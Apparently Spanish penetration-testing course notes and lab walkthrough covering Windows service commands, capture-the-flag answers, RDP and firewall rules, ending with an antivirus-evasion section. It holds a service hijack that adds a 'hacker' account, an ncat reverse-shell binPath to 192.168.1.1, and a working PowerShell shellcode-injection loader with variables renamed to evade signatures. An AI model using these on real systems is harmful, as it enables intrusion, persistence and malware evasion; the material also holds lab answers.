
```
C:\Windows\system32>psservice /?

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

PsService lists or controls services on a local or remote system.

Usage: psservice [\\Computer [-u Username [-p Password]]] <cmd> <optns>
Cmd is one of the following:
   query      Queries the status of a service
   config     Queries the configuration
   setconfig  Sets the configuration
   start      Starts a service
   stop       Stops a service
   restart    Stops and then restarts a service
   pause      Pauses a service
   cont       Continues a paused service
   depend     Enumerates the services that depend on the one specified
   find       Searches for an instance of a service on the network
   security   Reports the security permissions assigned to a service
Use the username and password to log into the remote computer in cases where
your account does not have permissions to perform the action you specify.

Omitting a command queries the active services on the specified computer.
Enter -? for help on a particular command.
Use option -nobanner to supress the startup banner and copyright message.
```

<br />

**Exercises**

**1. Usando el comando tasklist, filtre los resultados al servicio llamado dhcp. ¿Cuál es el nombre de la imagen asociada con ese servicio?**

Para este ejercicio lanzamos la ayuda del comando y observamos la opción /svc:

```
C:\> tasklist /?
[...]

 /SVC                    Displays services hosted in each process.

[...]
```

Esto es que coge todos los procesos del sistema y lista los servicios ejecutados por cada uno de estos procesos:

Así

```
C:\Users\offensive>tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A

[...]

svchost.exe                   1348 Dhcp

[...]
```

<br />

**2. Busque el servicio activo que contiene una bandera en el nombre. Proporcionar la bandera.**

Para buscar un servicio activo utilizamos sc query. Filtramos el contenido cpor '{' puesto que este es un elemento que contrendrá la flag:

```
PS C:\Users\offensive> sc.exe query | Select-String -Pattern '{' -Context 0,8

> SERVICE_NAME: WIN-SERVICE{What_A_Process}
> DISPLAY_NAME: WIN-SERVICE{What_A_Process}
          TYPE               : 10  WIN32_OWN_PROCESS
          STATE              : 4  RUNNING
                                  (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
          WIN32_EXIT_CODE    : 0  (0x0)
          SERVICE_EXIT_CODE  : 0  (0x0)
          CHECKPOINT         : 0x0
          WAIT_HINT          : 0x0
```

<br />

**3. Encuentre el proceso que tiene un servicio llamado "algoAlgoAlgo" asociado. Proporcione el nombre de la imagen como bandera.**

```
C:\Users\offensive>tasklist /svc | findstr "somethingSomethingSomething"
DarkSide.exe                  2432 somethingSomethingSomething
```

<br />

##### 3.4.3. Interacting with Services (net, taskkill, sc, psservice).

En esta sección vamos a ver cómo podemos intearctuar con servicios. Cubriremos cosas como *net*, *taskkill*, *sc* y *psservice*.

**net stop/start**

Como sabemos, el comando 'Net' se puede emplear para interactuar con muchos objetos del entorno de Windows como usuario, grupos, servicios y cuentas. Podemos emplear los subcomandos *net stop* y *net start* para interactuar con otros servicios:

```
C:\WINDOWS\system32>net stop WSearch
The Windows Search service is stopping
The Windows Search service was stopped successfully.

C:\WINDOWS\system32>net start WSearch
The Windows Search service is starting
The Windows Search service was starting successfully.
```

<br />

**sc config**

Por su parte sc (así como psservice) tienen más funcionalidades como buscar, ver, iniciar, parar o pausar servicios y configurar sus valores. Por ejemplo:

```
C:\Users\offensive>sc query WSearch

SERVICE_NAME: WSearch
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Aunque también podemos utilizar sc con el comando *sc config* para cambiar ciertos valores de los servicios por ejemplo: 

```
C:\Windows\system32>sc config WSearch start=auto
[SC] ChangeServiceConfig SUCCESS
```

Con el comando anterior hemos cambiaso el tipo de inicialización del servicio WSearch a automático. Además, así podemos ver por ejemplo con psservice la configuración del servicio cuyo parámetro acabamos de modificar:

```
C:\Windows\system32>psservice config WSearch

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: WSearch
DISPLAY_NAME: Windows Search
Provides content indexing, property caching, and search results for files, e-mail, and other content.
        TYPE              : 10 WIN32_OWN_PROCESS
        START_TYPE        : 2  AUTO_START
        ERROR_CONTROL     : 1  NORMAL
        BINARY_PATH_NAME  : C:\Windows\system32\SearchIndexer.exe /Embedding
```

Para iniciar el servicio podemos emplear tanto *net* como *sc*. 

```
C:\Windows\system32>sc start WSearch

SERVICE_NAME: WSearch
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
```

Y posteriormente empleamos *sc query* para buscar la configuración del 

```
C:\Users\offensive>sc query WSearch

SERVICE_NAME: WSearch
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
```

Veámos ahora cómo crear nuevos servicios. Primero, examinamos qué servicios están presentes en esta máquina 

```
C:\Users\offensive>net user

User accounts for \\WIN-NET01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
offensive                offsec                   WDAGUtilityAccount
The command completed successfully.
```

Ahora, creemos un nuevo servicio que tenga un binPath de "net user hacker /add"

```
C:\Windows\system32>sc config test binPath= "net user hacker /add"
[SC] ChangeServiceConfig SUCCESS
...
```

Ahora comencemos el servicio.

```
C:\Windows\system32>net start test
The service is not responding to the control function.

More help is available by typing NET HELPMSG 2186.


C:\Windows\system32>
```

Si bien tenemos un mensaje de error, verifiquemos a los usuarios.

```
C:\Users\offensive>net user

User accounts for \\WIN-NET01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
hacker                   offensive                offsec
WDAGUtilityAccount
The command completed successfully.
```

<br />

**1. Usando net start "servicex" para obtener la bandera.**

Como administrador iniciamos el servicio ejecutando el comando anterior y seguidamente recogemos la flag:

```
C:\Users\offensive>type Services_Flag1.txt
WIN-SERVICES{Cant_Stop_Me_Now}
```

<br />

**2.  Usando net sc stop "servicey" para obtener la bandera.**

Con el comando *net stop servicey* paramos el servicio y recuperamos la flag
 
<br />

**3.  Usando sc, cambie Start_Type del servicio DHCP de Auto a Disabled para obtener el indicador.**

Empleamos *sc qc* para obtener información del servicio:

```
C:\Users\offensive>sc qc Dhcp
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Dhcp
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
        LOAD_ORDER_GROUP   : TDI
        TAG                : 0
        DISPLAY_NAME       : DHCP Clien
        DEPENDENCIES       : NSI
                           : Afd
        SERVICE_START_NAME : NT Authority\LocalService
```

Comprobamos que efectivamente el START_TYPE está en auto, así, empleamos *sc config* para cambiar el valor del parámetro. Vemos la ayuda y con la ayuda configuramos el parámetro.

```
C:\Users\offensive>sc config Dhcp

[...]

 start= <boot|system|auto|demand|disabled|delayed-auto>

[...]

C:\Users\offensive>sc config Dhcp start= "disabled"
[SC] ChangeServiceConfig SUCCESS
```

<br />

**4.  Usando sc, cambie Binary_Path_Name del servicio DHCP a "ncat.exe 192.168.1.1 4444 -e cmd.exe" para obtener el indicador.**

De nuevo, con ayuda del manual configuramos el comando:

```
C:\Users\offensive>sc config Dhcp

[...]

 binPath= <BinaryPathName to the .exe file>

[...]

C:\Users\offensive>sc config Dhcp binPath= "ncat.exe 192.168.1.1 4444 -e cmd.exe"
[SC] ChangeServiceConfig SUCCESS

C:\Users\offensive>type Services_Flag4.txt
WIN-SERVICES{Hijacking_Services}
```

<br />

**5.  Usando PsService, cambie la configuración de tipo de inicio de "SNMPTRAP" a Auto para obtener el indicador.**

Empleamos la ayuda para obtener información de la configuración del servicio:

```
C:\Users\offensive>PsService /?

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

PsService lists or controls services on a local or remote system.

Usage: PsService [\\Computer [-u Username [-p Password]]] <cmd> <optns>
Cmd is one of the following:
   query      Queries the status of a service
   config     Queries the configuration
   setconfig  Sets the configuration
[...]
```

así, vemos que podemos utilizar *ps config* para ver la configuración de un servicio y *ps setconfig* para cambiar dicha configuración:

```
C:\Users\offensive>PsService config SNMPTRAP

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: SNMPTRAP
DISPLAY_NAME: SNMP Trap
Receives trap messages generated by local or remote Simple Network Management Protocol (SNMP) agents and forwards the messages to SNMP management programs running on this computer. If this service is stopped, SNMP-based programs on this computer will not receive SNMP trap messages. If this service is disabled, any services that explicitly depend on it will fail to start.
        TYPE              : 10 WIN32_OWN_PROCESS
        START_TYPE        : 3  DEMAND_START
        ERROR_CONTROL     : 1  NORMAL
        BINARY_PATH_NAME  : C:\Windows\System32\snmptrap.exe
        LOAD_ORDER_GROUP  :
        TAG               : 0
        DEPENDENCIES      :
        SERVICE_START_NAME: NT AUTHORITY\LocalService
        FAIL_RESET_PERIOD : -1 seconds
        FAILURE_ACTIONS   : Restart     DELAY: 60000 seconds
                          : Restart     DELAY: 60000 seconds
                          : None        DELAY: 0 seconds
```

Efectivamente, la configuración del servicio está en iniciar a demanda del usuario, de forma que:

```
C:\Users\offensive>PsService setconfig /?

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

Usage: PsService [\\Computer [-u Username [-p Password]]] setconfig <svc> <start-type>
Sets the start type of the specified service where start-type
is one of auto, demand and disabled.
```

Con lo que el comando es:

```
C:\Users\offensive>PsService setconfig SNMPTRAP Auto

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

Start type of SNMPTRAP on \\WIN-NET01 set to Auto.

C:\Users\offensive>type psservice_flag1.txt
WIN-SERVICES{auto_me_now!}
```

<br />



##### 3.4.4. Remote Desktop.

Remote Desktop es una función nativa de la mayoría de los sistemas Windows. Permite a los clientes usar el cliente de _Protocolo de escritorio remoto_ (RDP) para conectarse a servidores que se ejecutan en el puerto TCP 3389 de forma predeterminada. El gran beneficio de RDP es que podemos conectarnos a una computadora remota con capacidades de GUI. Usar RDP es bastante simple, ya que requiere el nombre/dominio o IP de la computadora, y las credenciales en la mayoría de los casos. Si tenemos esa información y hay un servidor RDP ejecutándose, podemos usar nuestro cliente RDP para conectarnos a la máquina remota.

Para usar RDP, haga clic en _Inicio_ , escriba "escritorio remoto" y haga clic en la aplicación "Conexión de escritorio remoto".

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230202104613.png' | relative_url }}" text-align="center"/>
</div>

Esto abrirá una ventana similar a la siguiente.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230202104626.png' | relative_url }}" text-align="center"/>
</div>

Podemos escribir el nombre de host de la computadora o la dirección IP. También podemos hacer clic en _Mostrar opciones_ para ver configuraciones avanzadas, como el nombre de usuario.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230202104640.png' | relative_url }}" text-align="center"/>
</div>

Una vez que hagamos clic en _Conectar_ , se abrirá otra ventana y se conectará a la computadora remota. Siempre que el servicio RDP esté habilitado y el tráfico pueda atravesar la red entre las computadoras locales y remotas, deberíamos poder conectarnos.

<br />

#### 3.5. Practical Challenge.

**Escenario: Usted es un técnico contratado para actualizar la documentación del cliente y solucionar problemas de red. El cliente le proporciona un sitio web (www.shimmervault.com) y un rango de IP /24 de 192.168.20.0.

En primer lugar nos conectamos a la maquina empleando 'ssh' con las credenciales 'offsec:offsec'. Esto nos dará acceso a una cmd de Windows.

<br />

**1.  El cliente no conoce la dirección IP de su servidor web. Encuentre y proporcione la dirección IP del servidor web.**

Realizando una operación de resolución de nombres con nslookup obtenemos el siguiente resultado:

```
offsec@WIN-NET-PRAC C:\Users\offsec>nslookup www.shimmervault.com
Server:  localhos
Address:  127.0.0.1

Name:    www.shimmervault.com
Address:  192.168.20.20
```

<br />

**2.  El cliente no conoce el nombre de la computadora del servidor web. Identifique el nombre de la computadora de la máquina con Windows.**

Dado que tenemos la IP realizamos una resolución de nombre inversa, una resolución de IPs:

```
offsec@WIN-NET-PRAC C:\Users\offsec>nslookup 192.168.20.20
Server:  localhos
Address:  127.0.0.1

DNS request timed out.
    timeout was 2 seconds.
*** Request to localhost timed-out
```

De esta forma, la resolución de la IP nos dirige a nuestro localhost y el nombre de nuestro localhost está incluido en el Prompt SSH: WIN-NET-PRAC.

<br />

**3.  Los empleados comparten archivos y mensajes a través de un share. Los clientes no han podido conectar esta máquina a un share. Monte el share remoto llamado "Quest_share" en la unidad H: para encontrar la bandera.**

Para montar el share primero debemos localizarlo. Para ello en primera instancia utilizamos el comando:

```
offsec@WIN-NET-PRAC C:\Users\offsec>net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
ADMIN$       C:\Windows                      Remote Admin
Quest_Share  C:\Quest_Share                  Internal Quest Share
The command completed successfully.
```

Así, observamos que los contenidos están en C:\\Quest_Share. De esta forma, montamos remotamente los contenidos del share en nuestra máquina local para volverlos accesibles (aunque curiosamente ya están contenidos localmente) con *net use* :

```
offsec@WIN-NET-PRAC C:\Users\offsec>net use H: \\WIN-NET-PRAC\Quest_Share
The command completed successfully.

offsec@WIN-NET-PRAC C:\Users\offsec>net use
New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
OK           H:        \\WIN-NET-PRAC\Quest_Share
                                                Microsoft Windows Network
The command completed successfully.
```

El comando anterior monta en una nueva unidad 'H:' los contenidos de la máquina remota WIN-NET-PRAC, (que es la nuestra) C:\\Quest_Share. Así, accedemos a la unidad H: de nuestro equipo y cogemos la flag.

```
offsec@WIN-NET-PRAC C:\Users\offsec>dir H:
 Volume in drive H has no label.
 Volume Serial Number is CE55-E38C

 Directory of H:\

11/01/2021  12:34 PM    <DIR>          .
11/01/2021  12:34 PM    <DIR>          ..
11/01/2021  12:34 PM               126 win-net-prac-quest-flag.txt
               1 File(s)            126 bytes
               2 Dir(s)  13,828,038,656 bytes free

offsec@WIN-NET-PRAC C:\Users\offsec>type H:win-net-prac-quest-flag.txt
WIN-NET-PRAC{Please_H3lp_with_our_R4t_problem_in_Th3_cellar} 
```

<br />

**4.  El cliente está teniendo dificultades para iniciar el servicio "enserv". Inicie el servicio "enserv" para obtener la bandera. La bandera estará en el directorio Documentos "offsec".**

En primer lugar buscamos el servicio y comprobamos que efectivamente existe y está parado:

```
offsec@WIN-NET-PRAC C:\Users\offsec>sc query enserv

SERVICE_NAME: enserv
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

De esta forma, lo iniciamos de nuevo con sc:

```
ffsec@WIN-NET-PRAC C:\Users\offsec>sc start enserv

SERVICE_NAME: enserv
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4200
        FLAGS              :

offsec@WIN-NET-PRAC C:\Users\offsec>sc query enserv

SERVICE_NAME: enserv
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

```

Y recuperamos la flag:

```
offsec@WIN-NET-PRAC C:\Users\offsec>type Documents\enserv-flag.txt 
WIN-NET-PRAC{The_enserv_Service_Iz_Runnin}
```

<br />

**5.  Conéctese a la máquina mediante RDP. ¿Qué es la bandera en la imagen de fondo del escritorio?**

Intentamos utilizar el siguiente comando, pero sin embargo se queda bloqueado:

```
rdesktop -u offsec -p offsec 192.168.96.63
Autoselecting keyboard map 'en-us' from locale
```

Al leer las pistas vemos que el firewall puede estar teniendo algo que ver.

Así, desde nuestra conexión SSH listamos las reglas del firewall con *netsh* en busca de algoq ue tenga que ver con el protocolo RDP o el puerto 3389. 

```
offsec@WIN-NET-PRAC C:\Users\offsec>powershell "netsh advfirewall firewall show rule name=all | Select-String -Pattern 3389 -Context 10,10"


  Rule Name:                            Remote Desktop - User Mode (UDP-In)
  ----------------------------------------------------------------------
  Enabled:                              No
  Direction:                            In
  Profiles:                             Domain,Private,Public
  Grouping:                             Remote Desktop
  LocalIP:                              Any
  RemoteIP:                             Any
  Protocol:                             UDP
> LocalPort:                            3389
  RemotePort:                           Any
  Edge traversal:                       No
  Action:                               Allow

  Rule Name:                            Remote Desktop - User Mode (TCP-In)
  ----------------------------------------------------------------------
  Enabled:                              No
  Direction:                            In
  Profiles:                             Domain,Private,Public
  Grouping:                             Remote Desktop
  LocalIP:                              Any
  RemoteIP:                             Any
  Protocol:                             TCP
> LocalPort:                            3389
  RemotePort:                           Any
  Edge traversal:                       No
  Action:                               Allow
```

Con el comando anterior listamos todos los servicios y filtramos por el puerto. Con esto descubirmos dos reglas no activadas que permiten el paso de tráfico RDP a través de TCP o UDP.

Así, ahora con *netsh advfirewall firewall set* vamos a cambiar la configuración de esta regla para habilitarla y permitir el paso del tráfico RDP. Observemos la importancia del término 'new' para setear una nueva configuración.

```
offsec@WIN-NET-PRAC C:\Users\offsec>netsh advfirewall firewall set rule name="Remote Desktop - User Mode (TCP-In)" new enable=yes

Updated 1 rule(s).
Ok.


offsec@WIN-NET-PRAC C:\Users\offsec>netsh advfirewall firewall show rule name="Remote Desktop - User Mode (TCP-In)"

Rule Name:                            Remote Desktop - User Mode (TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Remote Desktop
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            3389
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow
Ok.
```

La flag entonces será visible desde el escritorio.

<br />

**6.  El cliente le informó que se debe extraer una variable de entorno. Enumere las variables de entorno para la bandera.**

```
offsec@WIN-NET-PRAC C:\Users\offsec>set | findstr {
FLAG=WIN-NET-PRAC{50_M4nY_V4r1Abl35!}
```

<br />

**7.  Este dispositivo puede estar asociado con una red interna en otra interfaz. Encuentre la dirección IP de la otra interfaz. Proporcione la dirección IP como respuesta.**

```
offsec@WIN-NET-PRAC C:\Users\offsec>ipconfig
[...]
   IPv4 Address. . . . . . . . . . . : 10.10.23.13
```

<br />

**8.  El cliente necesita un archivo de texto comprimido dentro de un archivo zip. Busque el archivo zip ubicado en c:\\Users\\offsec\\Desktop. Utilice las habilidades que aprendió en este tema para descomprimir este archivo y recuperar la bandera que contiene.**

En primera instancia intetnamos acceder a los archivos de la carpeta pero esta nos deniega el acceso. Con el comando icacls vemos sus permisos y comprobamos que sólo el administrador o SYSTEM contienen total control del fichero:

```
offsec@WIN-NET-PRAC C:\Users\offsec\Desktop>icacls zip-flag.zip
zip-flag.zip NT AUTHORITY\SYSTEM:(F)
             BUILTIN\Administrators:(F)
             WIN-NET-PRAC\Administrator:(F)
```

De esta forma, con *net user* comprobamos que nuestro usuario forma parte del grupo adminstradores y que por tanto puede abrir si tiene acceso a la GUI una CMD como administrador:

```
offsec@WIN-NET-PRAC C:\Users\offsec\Desktop>net user offsec
User name                    offsec
Full Name                    offsec
Commen
User's commen
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/1/2021 12:22:07 PM
Password expires             Never
Password changeable          11/1/2021 12:22:07 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon scrip
User profile
Home directory
Last logon                   2/2/2023 12:18:12 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Desktop Users
                             *Users
Global Group memberships     *None
The command completed successfully.
```

De esta forma acudimos a la GUI, abrimos una CMD como admin y nos añadimos permisos de control total sobre el fichero .zip:

```
Adminstrator

C:\Users\offsec\Desktop>icacls zip-flag.zip /grant offsec:(F)
processed file: zip-flag.zip
Successfully processed 1 files; Failed processing 0 files
```

De esta forma, ahora desde nuestra sesión GUI, clickamos dos veces sobre el fichero comprimido para ver sus ficheros y dos veces sobre el fichero comprimido que contiene la flag para poder verla:

```
WIN-NET-PRAC{You_Got_The_Zip!}
```


<br />

### 4. Antivirus Evasion

El antivirus (AV) es una aplicación diseñado para prevenir y remover el software malicioso de una máquina. 

<br />

#### 4.1. Antivirus Software key Components and Operations.

**Known vs Unknown Threats**

En su diseño original, un software antivirus basa su funcionamiento y decisiones en firmas (signatures). El objetivo de una firma es identificar unívocamente una pieza específica de malware. Las firmas pueden variar en tanto en tipo como en características que pueden abarcar desde un hash de fichero hasta un match específico en una secuencia binaria. Como descubriremos en la siguiente sección, un AV consta de diferentes engines responsables de detectar y analizar componentes específicos del sistema en ejecución.

A menudo se define un lenguaje de firma (signature language) para cada engine de antivirus y, por lo tanto, una firma puede representar diferentes aspectos de una pieza de malware atendiendo a su forma en estático a su comportamiento en memoria, a su funcionalidad de red, etc, según el engine. Por ejemplo, se pueden desarrollar dos firmas para contrastar exactamente el mismo tipo de malware: una para apuntar al archivo de malware en el disco y otra para detectar su comunicación de red. La semántica de las dos firmas puede variar drásticamente, ya que están destinadas a dos engines AV diferentes. En 2014, un lenguaje de firma llamado YARA fue de código abierto para permitir a los investigadores consultar el VirusTotal plataforma o incluso integrar sus propias firmas de malware en productos AV. VirusTotal es un motor de búsqueda de malware que permite a los usuarios buscar malware conocido o enviar nuevas muestras y compararlas con una serie de productos antivirus.

Dado que las firmas se escriben en función de amenazas conocidas, los productos AV inicialmente solo podían detectar y reaccionar en función del malware que ya se había examinado y documentado. Sin embargo, las soluciones antivirus modernas, incluido Windows Defender, se envían con un engione llamado *Machine Learning* (ML) que se consulta cada vez que se descubre un archivo desconocido en un sistema. Estos motores ML pueden detectar amenazas desconocidas. Dado que los motores de ML funcionan en la nube, requieren una conexión activa a Internet, que a menudo no es una opción en los servidores empresariales internos. Además, los muchos motores que constituyen un AV no deben tomar prestados demasiados recursos informáticos del resto del sistema, ya que podría afectar la usabilidad del sistema.

Para superar estas limitaciones AV, las soluciones *Endpoint Detection and Response* (EDR) han evolucionado durante los últimos años. El software EDR es responsable de generar telemetría de eventos de seguridad y reenviarla a un sistema de gestión de eventos e información de seguridad (SIEM), que recopila datos de cada host de la empresa. Luego, SIEM representa estos eventos para que el equipo de analistas de seguridad pueda obtener una descripción general completa de cualquier ataque pasado o en curso que afecte a la organización.

Aunque algunas soluciones EDR incluyen componentes AV, los AV y los EDR no se excluyen mutuamente, ya que se complementan entre sí con visibilidad y detección mejoradas. En última instancia, su implementación debe evaluarse en función del diseño de la red interna de una organización y la postura de seguridad actual.

<br />

**AV Engined and Components**

En esencia, un AV moderno se nutre de actualizaciones de firmas obtenidas de la base de datos de firmas del proveedor que reside en Internet. Esas firmas se almacenan en la base de datos local accesible para el AV, que a su vez alimenta los motores más específicos.

Un antivirus moderno suele estar diseñado en torno a los siguientes componentes:

- *File Engine*: responsable de los análisis de archivos programados y en tiempo real.

- *Memory Engine*: inspecciona el espacio de memoria de cada proceso en tiempo de ejecución en busca de firmas binarias bien conocidas o llamadas API sospechosas que podrían resultar en ataques de inyección de memoria.

- *Network Engine*: inspecciona el tráfico de red entrante y saliente en la interfaz de red local. Una vez que se hace coincidir una firma, un motor de red podría intentar bloquear la comunicación del malware con su servidor C2.

- *Disassembler*: responsable de traducir el código de la máquina al lenguaje ensamblador, reconstruir la sección del código del programa original e identificar cualquier rutina de codificación/descodificación. 

- *Emulator/Sandbox*: un entorno aislado especial en el software AV donde el malware se puede cargar y ejecutar de forma segura sin causar estragos en el sistema.
- *Browser Plugin*.
- *Machine Learning Engine*.

Cada uno de las características anteriores funciona simultáneamente con la base de datos de firmas para clasificar eventos específicos como benignos, maliciosos o desconocidos.

<br />

**Detection Methods**

Ahora que conocemos los componentes de un AV y su función así de la cooperación global que tienen cada una de las partes veámos cómo un antivirus detecta malware y cuáles son las distintas técnicas que utiliza.

Entre las técnicas que veremos se encuentran:

- *Signature-based*: La detección antivirus basada en firma se considera principalmente una tecnología de lista restringida. En otras palabras, el sistema de archivos se escanea en busca de firmas de malware conocidas y, si se detecta alguna, los archivos infractores se ponen en cuarentena. Una firma puede ser tan simple como el hash del propio archivo o un conjunto de múltiples patrones, como valores binarios específicos y cadenas que deberían pertenecer solo a ese malware específico. Confiar solo en el hash del archivo como el único mecanismo de detección es una estrategia débil porque cambiar un solo bit del archivo daría como resultado un hash completamente diferente.

- *Heuristic-based*: es un método de detección que se basa en varias reglas y algoritmos para determinar si una acción se considera maliciosa o no. A menudo, esto se logra recorriendo el conjunto de instrucciones de un archivo binario o intentando desensamblar el código de la máquina y, en última instancia, descompilar y analizar el código fuente para obtener un mapa más completo del programa. La idea es buscar varios patrones y llamadas de programa (a diferencia de simples secuencias de bytes) que se consideran maliciosos.

- *Behavioral*: analiza dinámicamente el comportamiento de un archivo binario. A menudo, esto se logra ejecutando el archivo en cuestión en un entorno emulado.

- *Machine Learning*: tiene como objetivo mejorar el la detección mediante la introducción de algoritmos ML para detectar amenazas desconocidas mediante la recopilación y el análisis de metadatos adicionales.

<br />

#### 4.2. Bypassing Antivirus Detections.

En términos generales, la evasión antivirus se divide en dos grandes categorías: *On-disk* y *In-memory*. La evasión on-disk se enfoca en modificar archivos maliciosos almacenados físicamente en el disco en un intento de evadir las detecciones del motor de archivos AV. Sin embargo, dada la madurez de los motores modernos de análisis de archivos AV, el malware moderno a menudo intenta operar en la memoria (in-memory), lo que evita el disco por completo y, por lo tanto, reduce la posibilidad de ser detectado.

<br />

**In-Memory**

In-memory injections, también conocidas como *PE Injections*, es una técnica popular de bypass de antivirus. Uno de los principales beneficios de este tipo de ataque consiste en que no escribe sobre ningún fichero ya que se focaliza en la escritura de memoria volátil.

Esta técnica se subdivide en varias tipos de operaciones:

- *Remote Process Memory Injection*: Esta operación intenta inyectar la ejecución del payload malicioso sobre un proceso perteneciente a un ejecutable no malicioso.

- *DLL Injection*: Esta consiste en involucrar en la ejecución de un fichero una librería DLL maliciosa.

- *Process Hollowing*: Cuando se utiliza el Process Hollowing para eludir el software antivirus, los atacantes inician primero un proceso no malicioso en un estado suspendido. Una vez iniciado, la imagen del proceso se elimina de la memoria y se reemplaza con una imagen ejecutable maliciosa. Finalmente, el proceso se reanuda y se ejecuta un código malicioso en lugar del proceso legítimo.

- *Inline hooking*: Esta operación consiste en modificar la memoria para introducir una instrucción que redirige el flow de ejecución (un hook) sobre código malicioso.

<br />

#### 4.3. AV Evasion in Practice (Shellter).

**Evading AV with manual Thread Injection**

Ahora que tenemos un entendimiento general de las técnicas de detección más comunes empleadas por software antivirus veámos cómo podemos bypassear un antivirus.

En primer lugar, debemos tener claro que no existe una solucción universal para bypassear cualquier antivirus. Es más eficiente realizar una enumeración del tipo y versión de software que se está ejecutando en el target y a partir de ahí construir un bypass basándonos en las técnicas vistas anteriormente.

Dependiendo de cómo de restringido sea el enotrno de la máquina pawneada podemos realizar un bypass con PowerShell.

En el siguiente ejemplo vamos a emplear un *Remote Process Memory Injection* technique.

Una plantilla básica que realiza un *in-memory injection*:

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

Si seleccionásemos un shellcode y lo utilizásemos junto con este script de PowerShell veríamos (si lo subiésemos sobre VirusTotal) que parcialmente a conseguido engañar a algunos antivirus pero no a los suficientes.

Como se mencionó, los scripts son solo archivos de texto interpretados. 

Para detectar secuencias de comandos maliciosas, los proveedores de AV a menudo confían en firmas de cadenas estáticas relacionadas con partes de código significativas, como variables o nombres de funciones.

Para eludir esta lógica de detección, démosle a las variables del script anterior nombres más genéricos.

```
$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

[Byte[]];   
[Byte[]] $var1 = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28
...

$size = 0x1000;

if ($var1.Length -gt 0x1000) {$size = $var1.Length};

$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};

$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

